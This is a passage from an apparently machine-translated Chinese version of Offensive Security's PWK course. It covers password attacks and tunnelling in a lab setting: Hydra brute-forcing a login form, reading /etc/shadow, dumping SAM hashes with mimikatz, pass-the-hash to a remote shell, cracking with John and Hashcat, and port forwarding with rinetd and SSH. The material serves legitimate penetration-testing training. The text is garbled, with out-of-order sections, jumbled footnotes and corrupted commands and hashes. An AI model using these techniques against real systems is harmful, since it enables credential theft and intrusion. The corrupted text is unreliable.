+语法：`<url>:<parameters>:<string> [:optional>[:optional>]` 首先是服务器上的 GET/POST 变量，从浏览器编码的用户名和密码替换为 "`USER=`"（替换 "`USERNAME`"）和 "`PASS=`"（替换 "`PASS`"），第三是用于检查登录状态的字符串，这是大多数人出错的地方。定义参数是可选的：为了收集初始 cookie，也可以将这些参数放入这些头部中：发送定义的 HTTP 请求，无论用户是否发送头部，如果存在，都会在末尾添加头部。注意：如果你在你的头部中放置冒号（:），所有非冒号分隔符都应该被转义（上面的示例可能没有被 Hydra 解释）。
+
+列表 610 - 关于 http-post-form 的额外信息
+
+从此输出中，我们确定需要提供参数数量。首先，我们需要 IP 地址和 URL 作为 `Hydra` 的第一个参数。接下来，我们必须通过检查 HTML 代码来理解表单。图 294 显示了目标表单的代码：
+
+```html
+<html>
+<title>Web Form</title>
+<body>
+<form name="Form" method="post" action="frontpage.php">
+<p>Login:<input type="text" name="user"></p>
+<p>Password:<input type="password" name="pass"></p>
+<input type="submit" name="Login" value="Login">
+</form>
+</body>
+</html>
+```
+
+图 294: Web 表单的代码
+
+从这个部分，`/form.html` 页表明 POST 请求由 `/frontpage.php` 处理。由于我们正在用字典攻击 admin，组合参数变为 `/frontpage.php:user=admin&pass=`，其中 `PASS` 是字典条目的占位符。我们还必须提供字符串来指示登录是否失败。在我们的示例中，网页返回 "INVALID LOGIN"，如图 295 所示：
+
+列表 611 - 指定 http-post 语法
+
+将这些组合在一起，我们可以完成所示的 http-post 语法：
+
+
+
+```
+kali@kali:$ hydra 10.11.02.22 /frontpage.php?user=admin&pass= -l admin -P /usr/share/wordlists/rockyou -v -f
+Hydra v0.8 (c) 2019 by van Hauser /THC - starting on 2019-06-07 15:55:21
+[DATA] max 16 requests per server, overall 16 servers, 143439 login tries (1:p:143439)
+[ATTACK] http-post:10.11.02.22/frontpage.php?user=admin&pass= -INVALID LOGIN
+[RESOLVE] Resolving ... [RESOLVED] done
+[ATTEMPT] login admin "pass123456" - 1 of 143439 Hydra (child 0)
+[ATTEMPT] login admin "134" - 2 of 143439 Hydra (child 1)
+[ATTEMPT] login admin "1234568" - 3 of 143439 Hydra (child 2)
+[ATTEMPT] login admin "password" - 4 of 143439 Hydra (child 3)
+[ATTEMPT] login admin "loveyou" - 5 of 143439 Hydra (child 4)
+[ATTEMPT] login admin "princess" - 6 of 143439 Hydra (child 5)
+[ATTEMPT] login admin "1234567" - 7 of 143439 Hydra (child 6)
+[ATTEMPT] login admin "karina" - 268 of 143439 Hydra (child 7)
+[ATTEMPT] login admin "dookie" - 269 of 143439 Hydra (child 8)
+[ATTEMPT] login admin "hotmail" - 270 of 143439 Hydra (child 9)
+[ATTEMPT] login admin "0123456789" - 271 of 143439 Hydra (child 10)
+[00][http-post-form] host:10.11.02.22 login:admin password:crystal
+[STATUS] attack finished for 10.11.02.22 (valid password found)
+1 of 1 target successfully completed: valid password found
+Hydra @github.com/vanhauser-thc-hydra finished on 2019-06-07 15:55:22
+```
+
+585
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+尽管这需要对应用程序进行一些研究，但结果是值得的，因为发现了有效的密码。`Hydra` 包含的其他服务模块也非常值得投入精力掌握。
+
+## 19.3.4.1 练习
+
+（这些练习不需要报告）
+
+- 1. 针对 Windows 客户端上的表单运行 HTTP POST 密码攻击。
+- 2. 针对本地 Kali Linux 上的 Pure-FTPd 应用执行 FTP 密码攻击。
+
+## 19.4 利用密码哈希值
+
+接下来，我们将注意力放在密码哈希的使用上。
+
+加密哈希函数¹⁶² 是一种单向函数，它实现了一种算法，给定任意数据块并返回一个固定大小的字符串，称为“哈希值”或“消息摘要”。加密哈希最重要的用途之一就是应用程序验证和密码验证。
+
+### 19.4.1 获取密码哈希值
+
+大多数使用密码身份验证机制的系统都需要将这些密码存储在机器本地。现代身份验证机制不再以明文存储密码，而是将其存储为哈希值以提高安全性。对于操作系统、网络硬件等也是如此。这意味着在身份验证过程中，用户提供的密码会被哈希处理，并与之前存储的摘要进行比较。
+
+在没有关于程序或 Openwall 网站¹⁶³ 更多信息的情况下，识别确切的哈希类型有时是不可能的。在尝试识别摘要类型时，有三个重要的属性需要考虑。包括哈希的长度、哈希中使用的字符集以及哈希中使用的任何特殊字符。
+
+辅助哈希识别的有用工具是 `hashid`¹⁶⁴。要使用它，只需运行该工具并传入我们识别出的哈希即可。
+
+```
+kali@~$ hashid c43ee55d96bc7f691fe2fbbe8a5ef0a
+[*] MD2
+[*] MD5
+[*] MD4
+[*] LM
+```
+
+> ¹⁶² (Wikipedia, 2019), https://en.wikipedia.org/wiki/Cryptographic_hash_function
+
+> ¹⁶³ (Openwall, 2019), http://openwall.info/wiki/john/sample-hashes
+
+> ¹⁶⁴ (Psyp, 2015), https://psypanda.github.io/hashid/
+
+- [+] RIPEND-128
+- [+] Haval-128
+- [+] Tiger-128
+- [+] Skein-256(128)
+- [+] Skein-312(128)
+- [+] Lotus Notes/Domino 5
+- [+] Skype
+- [+] Sefru-128
+- [+] NTLM
+- [+] Domain Cached Credentials
+- [+] Domain Cached Credentials 2
+- [+] DNSEC (NSEC3)
+- [+] Radmin v2.2
+
+```
+kali@hash: '$61S6LXIAASS1BwUDsXCetlb1Th76WE.bI66AMYEDKXQ8s7JNFwa1s1KKtand
+6ZqsQQKAF3G0tHD9Db95NaS/s7COajRTJNWP2s'
+```
+
+- SHA-512 Crypt
+
+在上面，我们分析了两个不同的哈希。虽然第一个示例返回了多个匹配，但第二个将哈希缩小到了 SHA-512 Crypt。
+
+接下来，让我们在 Kali 系统上检索并分析几个哈希。许多系统使用存储在 `/etc/shadow` 文件中的用户密码哈希，这需要 root 权限查看：
+
+```
+kali@hash: sudo grep root /etc/shadow
+root:$6$R9w9Z2A8B5ZAfRBwP6M6BE.ElLs571VuccCAhYrXcG0VDeYUg5f8iwnXJkr.wtLDJI5IpoygccLaWtP/gwQ0J754:999999:
+```
+
+列表 614 - 从 Kali Linux `/etc/shadow` 获取的 root 哈希
+
+在第 614 行，我们发现了带有用户名的哈希。该哈希被分为多个字段，其中第一个 `($6$)` 指 SHA-512¹⁶ 算法。下一个字段是 salt,$⁶⁶ 它与明文一起计算密码哈希。盐是一个随机值，与明文一起计算密码哈希。这防止了哈希查询，因为密码哈希会根据盐值而变化。攻击者可以在表中存储预计算的哈希值。表可以包含 terabytes 的空间，但可以快速将哈希映射到明文。加盐增加了在计算实际哈希之前密码值的随机性。
+
+> ¹⁶⁵ (ashroot, 2013), https://www.shadow.com/how-are-passwords-stored
+
+> ¹⁶⁶ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Salt_cryptography
+
+> ¹⁶⁷ (nets.cc, 2012), https://nets.cc/Cryptography
+
+> ¹⁶⁸ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Hash_table
+
+## 使用 Kali Linux 进行渗透测试
+
+让我们转向 Windows 目标，讨论哈希实现以及我们如何利用它们。在 Windows 系统上，哈希密码存储在安全帐户管理器 (`SAM`)¹⁶⁹。为了防止离线密码攻击，微软引入了 `SYSKEY`¹⁷⁰ 功能来部分提取 SAM 文件。Windows NT 系统直到 Windows 2003 使用两种不同的哈希：LAN Manager (`LM`)¹⁷¹ 和 NT Manager (`NTLM`)¹² `LM` 被认为非常脆弱，因为超过七个字符的密码被分成两个字符串，每个部分都经过哈希处理；此外，`LM` 不包含盐，使得哈希查询攻击可行。从 Windows Vista 开始，操作系统默认禁用了 `LM` 并使用 `NTLM`；它更敏感，支持所有 Unicode 字符，并且不会将哈希分成部分。存储在 SAM 数据库中的 NTLM 哈希仍然带有盐。
+
+
+
+值得注意的是，操作系统运行时无法复制 SAM 数据库，因为 Windows 内核对其有独占锁。但我们可以使用 `mimikatz`¹⁵（在另一个模块中详细介绍）通过内存攻击来转储 SAM 哈希。`mimikatz` 模块可以从 `LSASS`¹⁷⁶ 进程内存中提取密码。由于 `LSASS` 是以 `SYSTEM` 用户身份运行的进程，我们必须从管理员提示符启动 `mimikatz`。提取密码，我们首先执行两个命令。第一个是 `privilege::debug`，允许篡改另一个进程。如果此命令失败，可能是 `mimikatz` 未以管理员权限运行。重要的是 `LSASS` 是一个 `SYSTEM` 进程，这意味着它的权限比管理员权限运行的 `mimikatz` 高。为了这个问题，可以使用 `token::elevate` 命令将安全性从高完整性提升到 `SYSTEM` 完整性。如果从 `SYSTEM` shell 启动 `mimikatz`，则不需要此步骤。现在来看这个过程：
+
+```
+C:\ C:\Tools\password_attacks\mimikatz.exe
+
+mimikatz # privilege:debug
+Privilege '20' OK
+
+mimikatz # token:elevate
+Token Id : 0
+user name : 
+SID name : NT AUTHORITY\SYSTEM
+Ip : (0x0000837e) 1 D 33697 NT AUTHORITY\SYSTEM S-1-15-18 (04g,2
+Primary -> Impersonated *
+* Process Token : (0x00020fe) 1 3790250 corp\off S-1-15-21-30488524-3634088-724522-1103 (12g,2p)
+```
+
+> ¹⁶⁹ (HashKiller, 2019), https://hashkiller.co.uk/
+
+> ¹⁷⁰ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Security_Accounts_Manager
+
+> ¹⁷¹ (Wikipedia, 2019), https://en.wikipedia.org/wiki/LM_hash
+
+> ¹⁷² (Wikipedia, 2019), https://en.wikipedia.org/wiki/Data_Encryption_Standard
+
+> ¹⁷³ (Wikipedia, 2019), https://en.wikipedia.org/wiki/NTLM
+
+> ¹⁷⁴ (Wikipedia, 2019), https://en.wikipedia.org/wiki/MD4
+
+> ¹⁷⁵ (Dimitrios Salamaris, 2017), https://blog.30.org/mimikatz-deep-dive-on-lsadump-patch-inject.html
+
+> ¹⁷⁶ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem
+
+列表 615 - 使用 `mimikatz` 转储 SAM
+
+> 值得注意的是，`token` 模块可能会列出 (`token:list`) 并使用 (`token:elevate`) 当前登录到机器的所有用户的令牌，在某些情况下，这些可能是其他机器的管理员。现在我们使用 `lsdump:sam` 来转储 SAM 数据库的内容：
+
+```
+mimikatz # lsdump:sam
+Domain : CLIENT251
+SysKey : 457154fe3c13064d8ce67ff93a29527cf
+Local SID : S-1-5-21-3426091779-1881636637-1944612440
+SAMKey : 9b60bd5bd5cfd63166e624f20a9a6e5
+
+RID : 000001f4 (500)
+User : Administrator
+
+RID : 000001f5 (501)
+User : Guest
+
+RID : 000001f7 (503)
+User : DefaultAccount
+
+RID : 000001f8 (504)
+User : WDAUTilityAccount
+H NTLM : @0c509aa8bcd12a26acf0d1e508cb28
+
+RID : 000003e9 (101)
+User : Offsec
+Hash NTLM : 28892d62cfdf84d7a702eb3b9f05c425e
+```
+
+列表 616 - 使用 `mimikatz` 转储 SAM 数据库
+
+正如我们看到的，`mimikatz` 优雅且有效地按照请求提取了哈希值。
+
+> 其他哈希提取工具，包括 `pwdump`、`fgdump`、⁵⁷⁷ 和 Windows Credential Editor (`wce`)⁵⁷⁸，对于 Windows XP 和 Windows Server 2003 等旧版 Windows 操作系统效果良好。
+
+### 19.4.1.1 练习
+
+（这些练习不需要报告）
+
+- 1. 在你的 Kali 系统中识别密码哈希版本。
+- 2. 使用 `mimikatz` 从 Windows 客户端的 SAM 数据库提取密码哈希。
+
+### 19.4.2 在 Windows 中传递哈希（Passing the Hash）
+
+正如我们在下一节中将发现的，破解密码哈希可能非常耗时，在没有强大硬件的情况下是不可行的。然而，我们可以利用 Windows 密码哈希，而无需经过费琐的破解过程。
+
+哈希传递（PtH）技术（于1997年发现）允许攻击者通过用户名和 NTLM/LM 哈希的组合而不是明文密码来对远程目标进行身份验证。这是可能的，因为 NTLM/LM 密码哈希没有加盐（salt）且保持静态会话。此外，如果我们在一个目标上发现了密码哈希，我们不仅可以使用它验证该目标，只要另一个目标具有相同的用户名和密码，我们就可以用它验证另一个目标。
+
+让我们引入一个场景来演示这种攻击。在我们的评估期间，我们发现多个系统中都启用了本地管理员账户。我们在其中一个系统发现了一个漏洞并获得了 `SYSTEM` 权限，允许我们提取本地的 LM 和 NTLM 哈希。我们复制了管理员的 NTLM 哈希，现在可以使用它代替密码访问另一台机器，该机器具有相同的本地管理员账户密码。
+
+要实现这一点，使用 Pass-The-Hash 工具包中的 `p-winexe`⁵⁷⁹（`winexe` 的修改版本），它使用 SMB 协议执行身份验证：
+
+```
+kali@kali:$ p-winexe
+winexe version 1.1
+This program may be freely redistributed under the terms of the GNU GPLv3
+Usage: winexe [OPTION]... // HOST COMMAND
+Options:
+  -h, --help                Display help message
+  -V, --version             Display version number
+```
+
+⁵⁷⁷ (FoofSec, 2008), http://foof.net/goizzyp/fgdump/downloads.html
+
+⁵⁷⁸ (Amplify Security, 2018), https://www.ampliascurity.com/research/windows-credentials/
+
+⁵⁷⁹ (by333d3r, 2015), https://github.com/by333d3r/pth-toolkit
+
+Penetration Testing with Kali Linux 2.0
+
+OFFENSIVE SECURITY
+
+www.offensive-security.com
+
+设置网络用户名
+
+`-U`, `--user=[DOMAIN]\USERNAME[%PASSWORD]`
+
+从文件获取凭据
+
+`-A`, `--authentication-file=FILE`
+
+列表 617 - 显示 `pth-winexe` 的帮助信息
+
+> 使用 SMB 协议在远程计算机上执行应用程序 `cmd` 需要管理员权限。这是因为需要验证到管理员 `C$` 并在随后创建 Windows 服务。
+
+作为演示，我们将在我们的 Kali 机器上调用 `pth-winexe`，使用之前提取的密码对目标进行身份验证。通过在 SMB（UNC 格式）中指定用户名和哈希 (`-u`) 以及以及要执行的命令名称（在列表 618 中为 `cmd`），我们将获得目标上的远程命令提示符。我们将忽略 `DOMAIN` 参数，并将用户名（后跟 `%` 符号）替换为哈希以完成命令。语法有点复杂，显示所示：
+
+
+
+```
+kali@kali: $ pth-winexe -u %aad3b43b51404eaa3b43b51404eae:2892d26cf8f4d7a0e2eb3b9f05ec4c25 // //10.11.0.22 cmd
+E_mdhash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows [Version 10.0.16299.309]
+(2017) Microsoft Corporation. All rights reserved.
+C:\Windows\system32>
+```
+
+### 列表 618 - 使用 `pth-winexe` 传递哈希
+
+根据列表 618 中的输出，命令执行成功，使用捕获的哈希作为凭据在目标上获得了 shell。
+
+在后台，NTLM 哈希的格式在身份验证过程中被更改为 NetLM 版本 1 或 2。我们可以通过中间人攻击捕获这些哈希，并对其进行破解⁵⁸ 或中继⁵⁹。例如，Internet Explorer 和 Windows 使用 代理自动发现（WPAD）⁵⁶ 来检测代理请求。如果我们在本地网络上，可以投毒这些请求并使用像 `Responder.py` 的工具强制进行 NTLM 身份验证。投毒对其他工具具有很大的破坏性，因此 `Responder.py` 不应在实验中使用。⁵⁸ (Wikipedia, 2019), https://en.wikipedia.org/wiki/NTLM_LAN⁵⁹ (Rob Brown, 2018), https://shellsecurity.com/pass-the-hash/crack/03/04/from-the-domain⁵⁶ (by333d3r, 2017), https://by333d3r.github.io/practical-guide-nt-relaying-in-getting-a-foothold-under-minutes.html⁵⁷ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery⁸ (SpiderLabs, 2019), https://github.com/SpiderLabs/Responder
+
+PWK 2.0
+
+Copyright © Offensive Security. All rights reserved.
+
+## 19.4.2.1 练习
+
+- 1. 使用 `Mimikatz` 从 Windows 客户端提取管理员用户的密码哈希。
+- 2. 从 Kali 系统重用密码哈希在 Windows 客户端进行哈希攻击。
+
+## 19.4.3 密码破解
+
+在密码学中，密码破解是根据存储的哈希恢复明文密码的过程。破解过程在高级上是简单的。一旦我们发现了哈希机制，就可以遍历字典列表中的每个单词并生成相应的摘要。与目标系统的哈希匹配，我们就得到了明文密码。这通常通过专业的密码破解程序完成。
+
+如果在身份验证过程中涉及盐而我们不知道盐的值，破解可能会变得极其复杂，甚至不可能，因为我们必须使用不同的盐反复哈希每个密码。然而，根据我们的经验，我们几乎总是能够获取包含每条记录唯一值的数据库，还是对所有哈希使用单一盐的配置文件。当这两个值已知时，破解的复杂性就会降低。
+
+一旦从目标系统获取了哈希，我们就可以在后台开始密码破解会话，随着我们继续评估。这与其他渗透测试过程一样，是迭代的，我们将再次转向 `John Ripper`，因为它支持几十种哈希格式，非常强大且灵活。`--fork` 选项允许多个进程利用单台机器甚至跨多台机器的 CPU 核心。
+
+例如，假设我们有两台机器，每台机器都配有 8 核心 CPU。在第一台机器上，我们会设置 `--fork=8` 和 `--node=1/8`，指示 John 创建进程，将字典列表分成八部分并在本地处理前八部分。在第二台机器上，我们可以使用 `--fork=8` 和 `--node=9-16` 分配剩余部分。
+
+使用 `mimikatz` 提取了哈希
+
+```
+kali@kali~$ cat hash.txt
+Account:8c50cca8b1c2da26acf01de508cb02
+Offsec:2892d26cdfd84a702eb3b9f85c42kali@kali~$ sudo john hash.txt --format=NT
+Using default encoding: UTF-8
+Rules using ISO-859-1
+Loaded 2 password hashes with no salts (NT [MD4:128/128 AVX4])
+Press 'q' or Ctrl-C to abort, any other key for status
+```
+
+### 列表 619 - 使用 John Ripper 进行暴力破解
+
+在上面的输出中，John 正确识别了哈希类型并开始破解。暴力破解将根据我们系统的速度花费很长时间。作为替代方案，我们可以使用 `wordlist` 参数提供字典列表的路径，从而缩短破解每个密码的时间：
+
+```
+kali@kali:~ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
+```
+
+### 列表 620 - 使用 John Ripper 破解
+
+如果仍有密码未破解，我们可以尝试使用 `--rules` 参数应用 JTR 的变形规则：
+
+```
+kali@kali:~ john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
+```
+
+### 列表 621 - 使用密码变异规则破解
+
+为了使用 JTR 破解基于 Linux 的哈希，我们首先需要使用 `unshadow` 工具从被入侵的系统收集密码哈希。
+
+```
+kali@kali:~ unshadow password-file hash.txt
+$M$65F0s3C5c7v2r88B0n5yqq7v77s$8p0n9:2010.../home/victim/bin/bash
+```
+
+```
+kali@kali:~ unshadow hash.txt > unshadow
+```
+
+### 列表 622 - 解析密码哈希进行破解
+
+现在可以使用 `john`，使用字典列表和 `unshadow` 文本作为参数：
+
+```
+kali@kali:~ john --wordlist=/usr/share/wordlists/rockyou.txt unshadow
+```
+
+```
+0:00:00:28 DONE (2019-08-20 15:42) 0.03559g/2497c/s
+```
+
+### 列表 623 - 使用 John Ripper 破解密码哈希
+
+较版本的 John Ripper 默认是多线程的，但仅使用单个 CPU 核心执行操作。如果你遇到旧版本的 JTR，可以使用替代方案来加速过程。我们采用多个 CPU 核心，甚至多台计算机来分配负载并加速破解过程。`--fork` 选项允许多个进程利用单台机器和跨机器的 CPU 核心。
+
+例如，假设我们有两台机器，每台机器都配有 8 核心 CPU。在第一台机器上，我们会设置 `--fork=8` 和 `--node=1/8`，指示 John 创建进程，将字典列表分成八部分并在本地处理前八部分。在第二台机器上，我们可以使用 `--fork=8` 和 `--node=9-16` 分配剩余部分。
+
+# 攻击性安全
+
+`www.offensive-security.com`
+
+基于 Kali Linux 的渗透测试 2.0
+
+将单词列表的后半部分分为八个进程。通过这种方式划分工作可以提供约 16 倍的性能提升。
+
+> 攻击者可以对密码预计算哈希值（这可能需要大量时间），并将其存储在巨大的数据库或彩虹表中^585。这使得密码破解变成了一个简单的表查找过程。这是一种空间权衡，因为这些表消耗了巨大的空间（取决于密码复杂度，达到 PB 级），但密码“破解”本身（技术上是一个查找过程）所需的时间要少得多。
+
+虽然 John 是破解哈希的极佳工具，但它的速度限于执行该任务的 CPU 性能。近年来，图形处理器（GPU）已变得极其强大，并且存在于每一台带有显示器的电脑中。高端机器（如用于视频编辑和游戏的机器）配备了极其强大的 GPU。像 `Hashcat`^586 这样的 GPU 破解工具利用了 CPU 和 GPU 的力量，达到了惊人的破解速度。
+
+`Hashcat` 的选项比 `John of Ripper` 更丰富，包含了算法检测和密码列表变异等功能。
+
+在示例中，我们将在带有 GeForce GTX 1080 GPU 的机器上以基准模式 (`-b`) 运行 `hashcat`：
+
+
+
+```
+C:\Users\Cracker\hashcat-4.2.1> hashcat64.exe -b
+hashcat (v4.2.1) starting in benchmark mode...
+...
+OpenCL Platform #1: NVIDIA Corporation
+===================
+* Device #1: GeForce GTX 1080 Ti, 2816/11264 MB allocable, 2860CU
+
+Benchmark relevant options:
+=============================
+* --optimized-kernel-enable
+
+Hashmode: 0 - MD5
+Speed.Dev.#1...... 39534.5 MH/s (93.70ms) @ Accel:128 Loops:1024 Thr:1024 Vec
+Hashmode: 100 - SHA1
+Speed.Dev.#1...... 13251.8 MH/s (87.49ms) @ Accel:128 Loops:512 Thr:640 Vec:1
+Hashmode: 1400 - SHA-256
+Speed.Dev.#1...... 47780.8 MH/s (48.15ms) @ Accel:128 Loops:64 Thr:1024 Vec
+```
+
+^585 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Rainbow_table
+
+^586 (Hashcat, 2018), https://hashcat.net/hashcat/
+
+Hashmode: 1700 - SHA-512
+
+- Speed.Dev.#1....: 156.9 MH/s (92.38ms) @ Accel:128 Loops:64 Thr:640 Vec:1
+
+- Hashmode: 1000 - NTLM
+
+- Speed.Dev.#1....: 65267.0 MH/s (55.66ms) @ Accel:128 Loops:1024 Thr:1024 Vec
+
+- Hashmode: 5500 - NetNTLMv1 / NetLMv1+ESS
+
+- Speed.Dev.#1....: 33504.0 MH/s (55.00ms) @ Accel:128 Loops:512 Thr:1024 Vec
+
+- Hashmode: 5600 - NetNTLMv2
+
+- Speed.Dev.#1....: 2761.2 MH/s (83.59ms) @ Accel:128 Loops:64 Thr:1024 Vec:1
+
+- Hashmode: 1800 - sha512crypt $66, SHA512 (Unix) (Iterations: 5000)
+
+- Speed.Dev.#1....: 218.6 MH/s (51.55ms) @ Accel:512 Loops:128 Thr:32 Vec:1
+
+## 列表 624 - GeForce GTX 1080 的基准破解速度
+
+基准数据非常惊人，揭示了每秒超过 10 亿次哈希的速度，NTLM 速度每秒超过 20 亿次哈希，而非常复杂且缓慢的 `sha512crypt` 算法以惊人的每秒 200,000 次哈希的速度运行。这些速度是通过单个 GPU 达到的；多 GPU 集群可以使用四个、八个或更多 GPU。在出版时，一个单 GPU 集群的成本约为 200 美元，四 GPU 平台的价格为 600 美元。八 GPU 系统的记录速度每秒超过了 50 亿次哈希！
+
+## 端口重定向与隧道
+
+在本模块中，我们将演示各种形式的端口重定向、隧道和封装。理解并掌握这些技术将为我们提供操纵目标流量方向流所需的工具，这在受限环境中通常非常有用。然而，这需要极其谨慎，因为这个模块有点像脑筋转弯。。可用的攻击工具和单词列表非常多，在渗透测试期间可能会忍不住直接跳进去并不断搜索。成功不仅取决于每个工具的使用和优势，还在于学会后退一步并智慧地使用这些工具，兼顾速度与优先考虑安全的平衡。
+
+### 20.1 端口转发
+
+端口转发是一种简单的流量操控技术，将指向某个 IP 地址或端口的流量重定向到另一个 IP 地址或端口。为了开始，我们将基于以下场景通过相对简单的端口转发示例：在这一场景中，我们通过连接互联网的 Linux 服务器访问了内网的客户端。由于客户端无法直接访问互联网，我们使用被攻的 Linux 服务器作为中转站，再次访问内网的其他机器，通过转发技术简化这一繁琐的数据传输过程。为了重建这一场景，连接互联网的 Kali 虚拟机将作为被攻的 Linux 服务器，而断网的 Debian Linux 箱作为内网。我们的环境如下：
+
+### 19.4.3 练习
+
+1. 为导出的哈希创建一个单词列表并使用 `John Ripper` 破解哈希。
+
+### 19.5 总结
+
+图296：出站过滤
+
+配置后，我们的 Kali 机器可以访问互联网，而客户端不能。我们可以通过在 Kali 机器上 `ping google.com` 并使用 `nc -nv 216.58.207.142 80` 连接该 IP 来验证连接性：
+
+```
+kali@kali:~$ ping google.com -c 1 bytes of data.
+PING google.com (216.58.207.142) 56(84) bytes of data.
+64 bytes transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/maxdev = 26.415/26.415/26.415/0.000 ms
+--- google.com ping statistics
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/maxdev = 26.415/26.415/26.415/0.000 ms
+kali@kali:-# nc -nv 216.58.207.142 80
+(UNKNOWN) (open)
+GET / HTTP/1.0
+HTTP/1.0 200 OK
+Date: Mon, 26 Aug 2019 15:38:42 GMT
+Expires: -1
+Cache-Control: private, max-age=0
+```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+```
+kali@kali:~# ssh student@10.11.0.128
+student@10.11.0.128:password$
+Linux debian 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb93 (2018-03-02) 1686
+```
+
+```
+student@debian:-# nc -nnv 216.58.207.142 80
+(UNKNOWN) [216.58.207.142] 80 (http) : No route to host
+sent 0, rcvd 0
+```
+
+**列表 626 - 由于缺少互联网连接而无法连接到外部 IP 地址**
+
+这次互联网连接测试失败了，表明我们的 Linux 客户端已与互联网连接。为了将文件传输到连接互联网的主机，我们必须先将其传输到 Linux Web 服务器，然后再次传输到目标地址。
+
+> 注意：在真实的渗透测试环境中，我们的目标很可能是将文件传输到我们的 Kali 攻击机（不一定像本场景中那样通过它），但原理是相同的。
+
+相反，我们使用一种名为 `rinetd` 的端口转发工具来重定向 Kali Linux 服务器上的流量。该工具配置简单，在 Kali Linux 仓库中可用，可以通过 `apt` 轻松安装：
+
+```
+kali@kali:-# sudo apt update && sudo apt install rinetd
+```
+
+**列表 627 - 从 Kali Linux 仓库中安装 rinetd**
+
+`rinetd` 配置文件 `/etc/rinetd.conf` 列出了需要四个参数的规则，包括 `bindaddress` 和 `bindport`（定义了绑定的（“监听”）IP 地址和端口），以及 `connectaddress` 和 `connectport`（定义了流量的目标地址和端口）：
+
+```
+kali@kali:-$ cat /etc/rinetd.conf
+...
+# 转发规则在此处
+# 你可以在特定的转发规则之后指定允许和拒绝规则，
+# 以仅应用于该条转发规则
+
+# bindaddress bindport connectaddress connectport
+...
+```
+
+**列表 628 - rinetd 的默认配置文件**
+
+例如，我们可以使用 `rinetd` 将 Kali Web 服务器在 80 端口接收到的任何流量重定向到我们在测试中使用的 `google.com` IP 地址。为此，我们编辑 `rinetd` 配置文件并指定以下转发规则：
+
+
+
+```
+kali@kali:-$ cat /etc/rinetd.conf
+
+# bindaddress bindport connectaddress connectport
+```
+
+590 (Thomas Boutilly, 2019), https://boutell.com/rinetd/
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+`0.0.0.0 80 216.58.207.142 80`
+
+**列表 629 - 向 rinetd 配置文件中添加转发规则**
+
+该规则规定，在我们的 Kali Linux 服务器 80 端口接收到的所有流量（监听所有接口 `0.0.0.0`），无论目标地址如何，都将被重定向到 `216.58.207.142:80`。这正是我们想要的。我们可以通过 `service` 命令重启 `rinetd` 服务，并使用 `ss`（套字统计）确认服务正在监听 TCP 端口 80：
+
+```
+kali@kali:-$ sudo service rinetd restart
+```
+
+```
+kali@kali:-$ ss -antp grep "80"
+LISTEN 0 5 0.0.0.0:80 0.0.0.0:* users:((inetd",pid=1886,fd=4))
+```
+
+**列表 630 - 启动 rinetd 服务并使用 ss 确认端口绑定**
+
+太棒了！端口正在监听。为了验证，我们可以连接到 Kali Linux 虚拟机上的 80 端口：
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+在我们的场景中，我们想要将 Kali 机器上的 445 端口（不带 NetBIOS 的微软网络共享）转发到 Windows Server 2016 目标机的 445 端口。当我们这样做时，任何指向我们 Kali 机器的微软文件共享都将被转发到我们的 Windows Server 2016 目标机。
+
+考虑到防火墙阻止了 TCP 445 端口的流量，这似乎是不可能的，但此端口转发是通过 SSH 会话隧道到我们 Linux 目标机的 22 端口的，而该端口是防火墙允许的。简而言之，请求将命中 Kali 机器的 445 端口，通过 SSH 会话转发，然后传递给 Windows Server 2016 目标机的 445 端口。
+
+如果反过来操作，我们的隧道和转发设置将如如图 298 所示：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_601_0.png)
+
+图 298：本地端口转发图
+
+为了实现这一目标，我们将从 Kali Linux 攻击机执行 `ssh` 命令。从技术上讲，我们不会发出任何命令（`-N`），但在本地机器上设置端口转发（`-L`），`0.0.0.0:445` 到 Windows Server 的 445 端口（`192.168.1.110:445`），并通过我们的原始 Linux 目标机进行，并以 `student`（`student10.11.0.128`）身份登录。
+
+```
+kali@kali~$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
+student10.11.0.128 password:
+```
+
+列表 634 - 将 Kali Linux 机器上的 TCP 端口 445 转发到 Windows Server 的 TCP 端口 445
+
+在任何时候，任何进入 Kali Linux 系统的 TCP 445 端口的连接都将通过我们被入侵的 Linux 客户端转发到 `192.168.1.110` IP 地址的 TCP 445 端口。
+
+在测试之前，我们需要对 Samba 配置进行更改，通过在如列表 635 所示在文件末尾添加 "`min protocol = SMB2`" 将最小 SMB 版本设为 SMBv2。这是因为 Windows Server 2016 默认不再支持 SMBv1。
+
+```
+kali@kali:~$ sudo nano /etc/samba/smb.conf
+```
+
+```
+kali@kali:~$ cat /etc/samba/smb.conf... 你还需要设置适当的 Unix 权限
+# 让这些用户对文件具有写入权限
+; write list = root, @lpadmin
+
+```
+
+min protocol = SMB2
+
+```
+
+```
+
+kali@kali:~$ sudo /etc/init.d/smbd restart
+
+[ ok ] Restarting smbd (via systemctl): smbd.service.
+
+```
+
+列表 635 - 将 Samba 从 SMBv1 通更新到 SMBv2
+
+最后，我们可以通过在 Kali 机器上发起请求，尝试列出 Windows Server 2016 上的远程共享。
+
+我们将使用 `smclient` 工具，提供 IP 地址或 NetBIOS 名称（在此例中为我们的本地机器 - `127.0.0.1`）和远程用户（`-U Administrator`）。如果一切按计划进行，我们将输入远程密码，所有流量将重定向到 Windows 机器，并将看到以下共享：
+
+```
+
+kali@kali:~# smclient -L 127.0.0.1 -U Administrator
+
+Unable to initialize messaging content
+
+Enter WORKGROUP\Administrator's password:
+
+```
+
+| 共享名称 | 类型 | 注释 |
+|---|---|---|
